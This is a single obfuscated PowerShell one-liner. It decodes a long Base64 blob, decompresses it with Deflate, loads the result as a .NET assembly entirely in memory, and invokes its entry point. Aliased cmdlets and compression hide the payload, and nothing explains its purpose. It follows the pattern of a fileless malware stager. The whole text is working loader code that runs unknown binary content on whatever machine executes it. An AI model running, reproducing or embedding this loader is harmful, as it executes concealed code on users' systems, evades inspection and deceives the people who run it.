sv o (New-Object IO.MemoryStream);sv d (New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('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'),[IO.Compression.CompressionMode]::Decompress));sv b (New-Object Byte[](1024));sv r (gv d).Value.Read((gv b).Value,0,1024);while((gv r).Value -gt 0){(gv o).Value.Write((gv b).Value,0,(gv r).Value);sv r (gv d).Value.Read((gv b).Value,0,1024);}[Reflection.Assembly]::Load((gv o).Value.ToArray()).EntryPoint.Invoke(0,@(,[string[]]@()))|Out-Null